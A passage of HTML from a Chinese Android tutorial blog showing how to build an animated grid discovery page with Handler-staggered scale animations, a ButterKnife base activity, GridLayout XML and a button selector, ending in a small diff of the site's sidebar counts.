HK&quot;,&quot;Noto Sans CJK SC&quot;,&quot;Noto Sans CJK TC&quot;,&quot;Noto Sans CJK JP&quot;,&quot;Source Han Sans SC&quot;,&quot;Source Han Sans TC&quot;,&quot;Source Han Sans&quot;,SimSun,LowLevelEmoji,&quot;Segoe UI Symbol&quot;,&quot;Segoe UI Historic&quot;,Symbola,Quivira,Meiryo,&quot;Malgun Gothic&quot;,NSimSun,MingLiU,MingLiU_HKSCS,SimSun-ExtB,MingLiU-ExtB,MingLiU_HKSCS-ExtB,&quot;Nimbus Roman No9 L&quot;,&quot;WenQuanYi Micro Hei&quot;,&quot;WenQuanYi Zen Hei&quot;,&quot;Droid Sans Fallback&quot;,&quot;Hiragino Sans GB&quot;,Symbol,FZSongS,&quot;Simsun (Founder Extended)&quot;,&quot;Microsoft Himalaya&quot;,&quot;Microsoft New Tai Lue&quot;,&quot;Microsoft PhagsPa&quot;,&quot;Microsoft Tai Le&quot;,&quot;Microsoft Uighur&quot;,&quot;Microsoft Yi Baiti&quot;,&quot;Mongolian Baiti&quot;,&quot;Estrangelo Edessa&quot;,Ebrima,Euphemia,Nyala,&quot;Plantagenet Cherokee&quot;,sylfaen,&quot;Arial Unicode MS&quot;,Code2000,HanaMinA,HanaMinB,Unifont; text-indent:28px" face="&quot;" color="#333333">Handler主要用于异步消息的处理：当发出一个消息之后，首先进入一个消息队列，发送消息的函数即刻返回，而另外一个部分在消息队列中逐一将消息取出，然后对消息进行处理，也就是发送消息和接收消息不是同步的处理。 这种机制通常用来处理相对耗时比较长的操作</font></font></p><p><br></p><pre name="code" class="java">public class BiaoDiscoverActivity extends BaseActivity {<br><br>    @Bind(R.id.ivBiaoClose)<br>    ImageView mIvClose;<br>    @Bind(R.id.rll_found_note)<br>    AutoRelativeLayout mrllNote;<br>    @Bind(R.id.rll_found_exam_time)<br>    AutoRelativeLayout mrllExamTime;<br>    @Bind(R.id.rll_found_class_room_search)<br>    AutoRelativeLayout mrllClassroom;<br>    @Bind(R.id.rll_found_score_search)<br>    AutoRelativeLayout mrllScore;<br>    @Bind(R.id.rll_found_super_act)<br>    AutoRelativeLayout mrllSuperAct;<br>    @Bind(R.id.rll_found_super_group)<br>    AutoRelativeLayout mrllSuperGroup;<br>    @Bind(R.id.rll_found_train_tickets)<br>    AutoRelativeLayout mrllTrainTickets;<br>    @Bind(R.id.rll_found_air_tickets)<br>    AutoRelativeLayout mrllAirTickets;<br>    @Bind(R.id.rll_found_school_recuit)<br>    AutoRelativeLayout mrllSchoolRecuit;<br>    @Bind(R.id.rll_found_house_rent)<br>    AutoRelativeLayout mrllHouseRent;<br>    @Bind(R.id.rll_found_entertainment_class)<br>    AutoRelativeLayout mrllEntertainment;<br><br>    //宫格图标<br>    private List&lt;AutoRelativeLayout&gt; rllList;<br>    private Handler handler;<br><br>    @Override<br>    protected BasePresenter createPresenter() {<br>        return null;<br>    }<br><br>    @Override<br>    protected int provideContentViewId() {<br>        return R.layout.activity_biao_discover;<br>    }<br><br><br>    @Override<br>    public void initView() {<br>        super.initView();<br>        initRll();<br>        initGrid();<br>        handler = new Handler();<br>    }<br><br>    private synchronized void initRll() {<br>        rllList = new ArrayList&lt;&gt;();<br>        rllList.add(mrllNote);<br>        rllList.add(mrllExamTime);<br>        rllList.add(mrllClassroom);<br>        rllList.add(mrllScore);<br>        rllList.add(mrllSuperAct);<br>        rllList.add(mrllSuperGroup);<br>        rllList.add(mrllTrainTickets);<br>        rllList.add(mrllAirTickets);<br>        rllList.add(mrllSchoolRecuit);<br>        rllList.add(mrllHouseRent);<br>        rllList.add(mrllEntertainment);<br>    }<br><br>    @Override<br>    protected void onResume() {<br>        super.onResume();<br>        itemsAnimation();<br>    }<br><br>    private void initGrid() {<br>        for (int i = 0; i &lt; rllList.size(); i++) {<br>            int finalI = i;<br>            //先全部隐藏<br>            rllList.get(finalI).setVisibility(View.GONE);<br>        }<br>    }<br><br>    private void itemsAnimation() {<br>        handler.postDelayed(new Runnable() {<br>            @Override<br>            public void run() {<br>                for (int i = 0; i &lt; rllList.size(); i++) {<br>                    int finalI = i;<br>                    //先全部隐藏<br>                    rllList.get(finalI).setAlpha(0);<br>                    rllList.get(finalI).setVisibility(View.VISIBLE);<br>                }<br>                for (int i = 0; i &lt; rllList.size(); i++) {<br>                    int finalI = i;<br>                    handler.postDelayed(new Runnable() {<br>                        @Override<br>                        public void run() {<br>                            //设置透明度为全不透明<br>                            rllList.get(finalI).setAlpha(1);<br>                            //再执行动画<br>                            rllList.get(finalI).startAnimation(AnimationUtils.loadAnimation(BiaoDiscoverActivity.this, R.anim.grid_items_scale));<br>                        }<br>                    }, 0 + i * 30);<br>                }<br>            }<br>        }, 200);<br><br>    }<br><br>    @Override<br>    public void initListener() {<br>        super.initListener();<br>        mIvClose.setOnClickListener(v -&gt; {<br>            finish();<br>            exitAct();<br>        });<br>        mrllClassroom.setOnClickListener(v -&gt; jumpToWebViewActivity(AppConst.H5_CLASSROOM_SEARCH));<br>        mrllScore.setOnClickListener(v -&gt; jumpToWebViewActivity(AppConst.H5_SCORE_RESULT_SEARCH));<br>        mrllSuperGroup.setOnClickListener(v -&gt; jumpToWebViewActivity(AppConst.H5_SUPER_GROUP));<br>        mrllTrainTickets.setOnClickListener(v -&gt; jumpToWebViewActivity(AppConst.H5_TRAIN_BUS_TICKETS));<br>        mrllSchoolRecuit.setOnClickListener(v -&gt; jumpToWebViewActivity(AppConst.H5_SCHOOL_RECUIT));<br>        mrllAirTickets.setOnClickListener(v -&gt; jumpToWebViewActivity(AppConst.H5_AIR_TICKETS));<br>        mrllHouseRent.setOnClickListener(v -&gt; jumpToWebViewActivity(AppConst.H5_HOUSE_RENT));<br>        mrllEntertainment.setOnClickListener(v -&gt; jumpToWebViewActivity(AppConst.H5_ENTERTAINMANIT_CLASS));<br>    }<br><br>    @Override<br>    public boolean onKeyDown(int keyCode, KeyEvent event) {<br>        if (keyCode == KeyEvent.KEYCODE_BACK) {<br>            finish();<br>            exitAct();<br>            return true;<br>        }<br>        return super.onKeyDown(keyCode, event);<br>    }<br><br>    private void exitAct() {<br>        UIUtils.startWindowAnimation(this, R.anim.window_as_pop_fade_in, R.anim.window_as_pop_fade_out);<br>    }<br>}</pre><p></p><p><br></p><font size="3">其父类为一个抽象类BaseActivity,子类中的各个重写方法在父类中的执行顺序如下</font><p><br></p><p></p><pre name="code" class="java">protected void onCreate(@Nullable Bundle savedInstanceState) {<br>        super.onCreate(savedInstanceState);<br><br>        setContentView(provideContentViewId());<br>        ButterKnife.bind(this);<br><br>        initView();<br>        initListener();<br>        initData();<br><br>    }</pre><p></p><p><br></p><font size="3">这样，只需在子类中重写provideContentViewId()方法，返回子类的content布局资源文件的值就可以了，子类不再需要设置布局ID，也不再需要每次调用ButterKnife.bind()</font><p><br></p><p><font size="6">下面是重点</font></p><p><font size="3">宫格布局的实现</font></p><p><font size="3">以下是BiaoDiscoverActivity的布局资源文件</font></p><p><font size="3">首先向 zhy 的 AutoLayout 表示感谢</font></p><p></p><pre name="code" class="html">&lt;?xml version=”1.0” encoding=”utf-8”?&gt;<br>&lt;com.zhy.autolayout.AutoRelativeLayout<br>    xmlns:android=”<a href="http://schemas.android.com/apk/res/android&quot;" target="_blank" rel="noopener">http://schemas.android.com/apk/res/android&quot;</a><br>    android:layout_width=”match_parent”<br>    android:layout_height=”match_parent”&gt;<br><br>    &lt;com.zhy.autolayout.AutoRelativeLayout<br>        xmlns:android=”<a href="http://schemas.android.com/apk/res/android&quot;" target="_blank" rel="noopener">http://schemas.android.com/apk/res/android&quot;</a><br>        android:layout_width=”match_parent”<br>        android:layout_height=”wrap_content”<br>        android:background=”@drawable/ic_found_bg”<br>        android:paddingBottom=”@dimen/biao_discover_root_padding_bottom”<br>        android:paddingTop=”@dimen/biao_discover_root_padding_top”<br>        &gt;<br><br>        &lt;include<br>            layout=”@layout/include_toolbar”<br>            android:visibility=”gone”<br>            /&gt;<br><br>        &lt;GridLayout<br>            android:layout_width=”match_parent”<br>            android:layout_height=”match_parent”<br>            android:layout_alignParentTop=”true”<br>            android:layout_centerHorizontal=”true”<br>            android:layout_gravity=”center_horizontal”<br>            android:columnCount=”3”<br>            android:rowCount=”4”&gt;<br><br><br>            &lt;com.zhy.autolayout.AutoRelativeLayout<br>                android:id=”@+id/rll_found_note”<br>                android:layout_width=”wrap_content”<br>                android:layout_column=”0”<br>                android:layout_columnWeight=”1”<br>                android:layout_row=”0”<br>                android:layout_rowWeight=”1”<br>                android:visibility=”visible”<br>                &gt;<br><br>                &lt;ImageView<br>                    android:id=”@+id/imageView3”<br>                    android:layout_width=”wrap_content”<br>                    android:layout_height=”@dimen/biao_discover_item_iv_height”<br>                    android:src=”@drawable/ic_found_note_icon”<br>                    android:layout_centerVertical=”true”<br>                    android:layout_centerHorizontal=”true”/&gt;<br><br>                &lt;TextView<br>                    android:layout_width=”wrap_content”<br>                    android:layout_height=”wrap_content”<br>                    android:layout_below=”@+id/imageView3”<br>                    android:layout_centerHorizontal=”true”<br>                    android:layout_marginTop=”@dimen/biao_discover_item_tv_margin_top”<br>                    android:text=”@string/biao_note”<br>                    android:textColor=”@color/gray2”<br>                    android:textSize=”@dimen/biao_discover_item_tv_text_size”/&gt;<br>            &lt;/com.zhy.autolayout.AutoRelativeLayout&gt;<br><br><br>            &lt;com.zhy.autolayout.AutoRelativeLayout<br>                android:id=”@+id/rll_found_exam_time”<br>                android:layout_width=”wrap_content”<br>                android:layout_column=”1”<br>                android:layout_columnWeight=”1”<br>                android:layout_row=”0”<br>                android:layout_rowWeight=”1”<br>                android:visibility=”visible”<br>                &gt;<br><br>                &lt;ImageView<br>                    android:id=”@+id/imageView4”<br>                    android:layout_width=”wrap_content”<br>                    android:layout_height=”@dimen/biao_discover_item_iv_height”<br>                    android:src=”@drawable/ic_found_countdown_icon”<br>                    android:layout_centerVertical=”true”<br>                    android:layout_centerHorizontal=”true”/&gt;<br><br>                &lt;TextView<br>                    android:layout_width=”wrap_content”<br>                    android:layout_height=”wrap_content”<br>                    android:layout_below=”@+id/imageView4”<br>                    android:layout_centerHorizontal=”true”<br>                    android:layout_marginTop=”@dimen/biao_discover_item_tv_margin_top”<br>                    android:text=”@string/biao_exam_time”<br>                    android:textColor=”@color/gray2”<br>                    android:textSize=”@dimen/biao_discover_item_tv_text_size”/&gt;<br>            &lt;/com.zhy.autolayout.AutoRelativeLayout&gt;<br><br>            &lt;com.zhy.autolayout.AutoRelativeLayout<br>                android:id=”@+id/rll_found_class_room_search”<br>                android:layout_width=”wrap_content”<br>                android:layout_column=”2”<br>                android:layout_columnWeight=”1”<br>                android:layout_row=”0”<br>                android:layout_rowWeight=”1”<br>                android:visibility=”visible”<br>                &gt;<br><br>                &lt;ImageView<br>                    android:id=”@+id/imageView5”<br>                    android:layout_width=”wrap_content”<br>                    android:layout_height=”@dimen/biao_discover_item_iv_height”<br>                    android:src=”@drawable/ic_found_room_search”<br>                    android:layout_centerVertical=”true”<br>                    android:layout_centerHorizontal=”true”/&gt;<br><br>                &lt;TextView<br>                    android:layout_width=”wrap_content”<br>                    android:layout_height=”wrap_content”<br>                    android:layout_below=”@+id/imageView5”<br>                    android:layout_centerHorizontal=”true”<br>                    android:layout_marginTop=”@dimen/biao_discover_item_tv_margin_top”<br>                    android:text=”@string/biao_classroom_search”<br>                    android:textColor=”@color/gray2”<br>                    android:textSize=”@dimen/biao_discover_item_tv_text_size”/&gt;<br>            &lt;/com.zhy.autolayout.AutoRelativeLayout&gt;<br><br>            &lt;com.zhy.autolayout.AutoRelativeLayout<br>                android:id=”@+id/rll_found_score_search”<br>                android:layout_width=”wrap_content”<br>                android:layout_column=”0”<br>                android:layout_columnWeight=”1”<br>                android:layout_row=”1”<br>                android:layout_rowWeight=”1”<br>                android:visibility=”visible”<br>                &gt;<br><br>                &lt;ImageView<br>                    android:id=”@+id/imageView6”<br>                    android:layout_width=”wrap_content”<br>                    android:layout_height=”@dimen/biao_discover_item_iv_height”<br>                    android:src=”@drawable/ic_found_score_search”<br>                    android:layout_centerVertical=”true”<br>                    android:layout_centerHorizontal=”true”/&gt;<br><br>                &lt;TextView<br>                    android:layout_width=”wrap_content”<br>                    android:layout_height=”wrap_content”<br>                    android:layout_below=”@+id/imageView6”<br>                    android:layout_centerHorizontal=”true”<br>                    android:layout_marginTop=”@dimen/biao_discover_item_tv_margin_top”<br>                    android:text=”@string/biao_score_search”<br>                    android:textColor=”@color/gray2”<br>                    android:textSize=”@dimen/biao_discover_item_tv_text_size”/&gt;<br>            &lt;/com.zhy.autolayout.AutoRelativeLayout&gt;<br><br>            &lt;com.zhy.autolayout.AutoRelativeLayout<br>                android:id=”@+id/rll_found_super_act”<br>                android:layout_width=”wrap_content”<br>                android:layout_column=”1”<br>                android:layout_columnWeight=”1”<br>                android:layout_row=”1”<br>                android:layout_rowWeight=”1”<br>                android:visibility=”visible”<br>                &gt;<br><br>                &lt;ImageView<br>                    android:id=”@+id/imageView7”<br>                    android:layout_width=”wrap_content”<br>                    android:layout_height=”@dimen/biao_discover_item_iv_height”<br>                    android:src=”@drawable/ic_found_super_act”<br>                    android:layout_centerVertical=”true”<br>                    android:layout_centerHorizontal=”true”/&gt;<br><br>                &lt;TextView<br>                    android:layout_width=”wrap_content”<br>                    android:layout_height=”wrap_content”<br>                    android:layout_below=”@+id/imageView7”<br>                    android:layout_centerHorizontal=”true”<br>                    android:layout_marginTop=”@dimen/biao_discover_item_tv_margin_top”<br>                    android:text=”@string/biao_super_act”<br>                    android:textColor=”@color/gray2”<br>                    android:textSize=”@dimen/biao_discover_item_tv_text_size”/&gt;<br>            &lt;/com.zhy.autolayout.AutoRelativeLayout&gt;<br><br>            &lt;com.zhy.autolayout.AutoRelativeLayout<br>                android:id=”@+id/rll_found_super_group”<br>                android:layout_width=”wrap_content”<br>                android:layout_column=”2”<br>                android:layout_columnWeight=”1”<br>                android:layout_row=”1”<br>                android:layout_rowWeight=”1”<br>                android:visibility=”visible”<br>                &gt;<br><br>                &lt;ImageView<br>                    android:id=”@+id/imageView8”<br>                    android:layout_width=”wrap_content”<br>                    android:layout_height=”@dimen/biao_discover_item_iv_height”<br>                    android:src=”@drawable/ic_found_super_group”<br>                    android:layout_centerVertical=”true”<br>                    android:layout_centerHorizontal=”true”/&gt;<br><br>                &lt;TextView<br>                    android:layout_width=”wrap_content”<br>                    android:layout_height=”wrap_content”<br>                    android:layout_below=”@+id/imageView8”<br>                    android:layout_centerHorizontal=”true”<br>                    android:layout_marginTop=”@dimen/biao_discover_item_tv_margin_top”<br>                    android:text=”@string/biao_super_group”<br>                    android:textColor=”@color/gray2”<br>                    android:textSize=”@dimen/biao_discover_item_tv_text_size”/&gt;<br>            &lt;/com.zhy.autolayout.AutoRelativeLayout&gt;<br><br>            &lt;com.zhy.autolayout.AutoRelativeLayout<br>                android:id=”@+id/rll_found_train_tickets”<br>                android:layout_width=”wrap_content”<br>                android:layout_column=”0”<br>                android:layout_columnWeight=”1”<br>                android:layout_row=”2”<br>                android:layout_rowWeight=”1”<br>                android:visibility=”visible”<br>                &gt;<br><br>                &lt;ImageView<br>                    android:id=”@+id/imageView9”<br>                    android:layout_width=”wrap_content”<br>                    android:layout_height=”@dimen/biao_discover_item_iv_height”<br>                    android:src=”@drawable/ic_found_bus”<br>                    android:layout_centerVertical=”true”<br>                    android:layout_centerHorizontal=”true”/&gt;<br><br>                &lt;TextView<br>                    android:layout_width=”wrap_content”<br>                    android:layout_height=”wrap_content”<br>                    android:layout_below=”@+id/imageView9”<br>                    android:layout_centerHorizontal=”true”<br>                    android:layout_marginTop=”@dimen/biao_discover_item_tv_margin_top”<br>                    android:text=”@string/biao_train_bus_tickets”<br>                    android:textColor=”@color/gray2”<br>                    android:textSize=”@dimen/biao_discover_item_tv_text_size”/&gt;<br>            &lt;/com.zhy.autolayout.AutoRelativeLayout&gt;<br><br>            &lt;com.zhy.autolayout.AutoRelativeLayout<br>                android:id=”@+id/rll_found_air_tickets”<br>                android:layout_width=”wrap_content”<br>                android:layout_column=”1”<br>                android:layout_columnWeight=”1”<br>                android:layout_row=”2”<br>                android:layout_rowWeight=”1”<br>                android:visibility=”visible”<br>                &gt;<br><br>                &lt;ImageView<br>                    android:id=”@+id/imageView10”<br>                    android:layout_width=”wrap_content”<br>                    android:layout_height=”@dimen/biao_discover_item_iv_height”<br>                    android:src=”@drawable/ic_found_airplane”<br>                    android:layout_centerVertical=”true”<br>                    android:layout_centerHorizontal=”true”/&gt;<br><br>                &lt;TextView<br>                    android:layout_width=”wrap_content”<br>                    android:layout_height=”wrap_content”<br>                    android:layout_below=”@+id/imageView10”<br>                    android:layout_centerHorizontal=”true”<br>                    android:layout_marginTop=”@dimen/biao_discover_item_tv_margin_top”<br>                    android:text=”@string/biao_air_tickets”<br>                    android:textColor=”@color/gray2”<br>                    android:textSize=”@dimen/biao_discover_item_tv_text_size”/&gt;<br>            &lt;/com.zhy.autolayout.AutoRelativeLayout&gt;<br><br>            &lt;com.zhy.autolayout.AutoRelativeLayout<br>                android:id=”@+id/rll_found_school_recuit”<br>                android:layout_width=”wrap_content”<br>                android:layout_column=”2”<br>                android:layout_columnWeight=”1”<br>                android:layout_row=”2”<br>                android:layout_rowWeight=”1”<br>                android:visibility=”visible”<br>                &gt;<br><br>                &lt;ImageView<br>                    android:id=”@+id/imageView11”<br>                    android:layout_width=”wrap_content”<br>                    android:layout_height=”@dimen/biao_discover_item_iv_height”<br>                    android:src=”@drawable/ic_found_school_recuit”<br>                    android:layout_centerVertical=”true”<br>                    android:layout_centerHorizontal=”true”/&gt;<br><br>                &lt;TextView<br>                    android:layout_width=”wrap_content”<br>                    android:layout_height=”wrap_content”<br>                    android:layout_below=”@+id/imageView11”<br>                    android:layout_centerHorizontal=”true”<br>                    android:layout_marginTop=”@dimen/biao_discover_item_tv_margin_top”<br>                    android:text=”@string/biao_school_recuit”<br>                    android:textColor=”@color/gray2”<br>                    android:textSize=”@dimen/biao_discover_item_tv_text_size”/&gt;<br>            &lt;/com.zhy.autolayout.AutoRelativeLayout&gt;<br><br>            &lt;com.zhy.autolayout.AutoRelativeLayout<br>                android:id=”@+id/rll_found_house_rent”<br>                android:layout_width=”wrap_content”<br>                android:layout_column=”0”<br>                android:layout_columnWeight=”1”<br>                android:layout_row=”3”<br>                android:layout_rowWeight=”1”<br>                android:visibility=”visible”<br>                &gt;<br><br>                &lt;ImageView<br>                    android:id=”@+id/imageView12”<br>                    android:layout_width=”wrap_content”<br>                    android:layout_height=”@dimen/biao_discover_item_iv_height”<br>                    android:src=”@drawable/ic_found_rent_house”<br>                    android:layout_centerVertical=”true”<br>                    android:layout_centerHorizontal=”true”/&gt;<br><br>                &lt;TextView<br>                    android:layout_width=”wrap_content”<br>                    android:layout_height=”wrap_content”<br>                    android:layout_below=”@+id/imageView12”<br>                    android:layout_centerHorizontal=”true”<br>                    android:layout_marginTop=”@dimen/biao_discover_item_tv_margin_top”<br>                    android:text=”@string/biao_house_rent”<br>                    android:textColor=”@color/gray2”<br>                    android:textSize=”@dimen/biao_discover_item_tv_text_size”/&gt;<br>            &lt;/com.zhy.autolayout.AutoRelativeLayout&gt;<br><br>            &lt;com.zhy.autolayout.AutoRelativeLayout<br>                android:id=”@+id/rll_found_entertainment_class”<br>                android:layout_width=”wrap_content”<br>                android:layout_column=”1”<br>                android:layout_columnWeight=”1”<br>                android:layout_row=”3”<br>                android:layout_rowWeight=”1”<br>                android:visibility=”visible”<br>                &gt;<br><br>                &lt;ImageView<br>                    android:id=”@+id/imageView13”<br>                    android:layout_width=”wrap_content”<br>                    android:layout_height=”@dimen/biao_discover_item_iv_height”<br>                    android:src=”@drawable/ic_found_entertainment_class”<br>                    android:layout_centerVertical=”true”<br>                    android:layout_centerHorizontal=”true”/&gt;<br><br>                &lt;TextView<br>                    android:layout_width=”wrap_content”<br>                    android:layout_height=”wrap_content”<br>                    android:layout_below=”@+id/imageView13”<br>                    android:layout_centerHorizontal=”true”<br>                    android:layout_marginTop=”@dimen/biao_discover_item_tv_margin_top”<br>                    android:text=”@string/biao_entertainment_class”<br>                    android:textColor=”@color/gray2”<br>                    android:textSize=”@dimen/biao_discover_item_tv_text_size”/&gt;<br>            &lt;/com.zhy.autolayout.AutoRelativeLayout&gt;<br>        &lt;/GridLayout&gt;<br>    &lt;/com.zhy.autolayout.AutoRelativeLayout&gt;<br><br>    &lt;ImageView<br>        android:id=”@+id/ivBiaoClose”<br>        android:layout_width=”90dp”<br>        android:layout_height=”wrap_content”<br>        android:layout_alignParentBottom=”true”<br>        android:layout_centerHorizontal=”true”<br>        android:adjustViewBounds=”true”<br>        android:src=”@drawable/selector_found_close_btn”/&gt;<br>&lt;/com.zhy.autolayout.AutoRelativeLayout&gt;</pre><br><font size="3">这个宫格布局的实现方法不是唯一的，但以上实现方法可以保证95%以上的相似，以上用到的所有图标资源请自行搜索</font><p></p><p><font size="3">下面是实现后的效果</font></p><p><font size="3"><br></font></p><p><img src="http://img.blog.csdn.net/20170615223623150?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvemJsMTE0NjU1NjI5OA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" _xhe_src="http://img.blog.csdn.net/20170615223623150?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvemJsMTE0NjU1NjI5OA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="" width="200" align="middle"><br></p><p><br></p><p><font size="3">需要注意的是，布局中的图标应避免处于父布局的边缘位置，因为执行动画过程中，尤其是缩放动画，超出父布局的部分不会显示</font></p><p><font size="3">图标的缩放动画在同样在XML文件中进行定义，这里用到了两个缩放动画，可以设置第二个动画开始时间偏移量为第一个动画的时长，这样可以使最终效果非常自然、连贯，此处加入一个透明度渐变动画，和原版更为贴近</font></p><p><font size="3"><br></font></p><p><font size="3"></font></p><pre name="code" class="html">&lt;?xml version=”1.0” encoding=”utf-8”?&gt;<br>&lt;set xmlns:android=”<a href="http://schemas.android.com/apk/res/android&quot;" target="_blank" rel="noopener">http://schemas.android.com/apk/res/android&quot;</a>&gt;<br>    &lt;scale<br>        android:duration=”75”<br>        android:fromXScale=”0.5”<br>        android:fromYScale=”0.5”<br>        android:interpolator=”@android:anim/decelerate_interpolator”<br>        android:pivotX=”50%”<br>        android:pivotY=”50%”<br>        android:startOffset=”0”<br>        android:toXScale=”1”<br>        android:toYScale=”1”/&gt;<br>    &lt;scale<br>        android:duration=”75”<br>        android:fromXScale=”1.2”<br>        android:fromYScale=”1.2”<br>        android:interpolator=”@android:anim/decelerate_interpolator”<br>        android:pivotX=”50%”<br>        android:pivotY=”50%”<br>        android:startOffset=”75”<br>        android:toXScale=”1”<br>        android:toYScale=”1”/&gt;<br><br>    &lt;alpha<br>        android:duration=”100”<br>        android:fromAlpha=”0”<br>        android:toAlpha=”1”/&gt;<br>&lt;/set&gt;</pre><br><p></p><p><font size="3">底部的关闭按钮用selector的形式定义，实现点击的效果</font></p><p><font size="3"><br></font></p><pre name="code" class="html">&lt;?xml version=”1.0” encoding=”utf-8”?&gt;<br>&lt;selector xmlns:android=”<a href="http://schemas.android.com/apk/res/android&quot;" target="_blank" rel="noopener">http://schemas.android.com/apk/res/android&quot;</a>&gt;<br>    &lt;item android:drawable=”@drawable/ic_found_close_press” android:state_pressed=”true”/&gt;<br>    &lt;item android:drawable=”@drawable/ic_found_close” android:state_enabled=”false”/&gt;<br>&lt;/selector&gt;</pre><br><p></p><p><font size="3"><br></font></p><p><font size="3"><br></font></p><p><font size="3"><br></font></p><p><br></p>
 
           
         
@@ -495,14 +1830,32 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
             
 
             
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
 
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
             
 
           </nav>
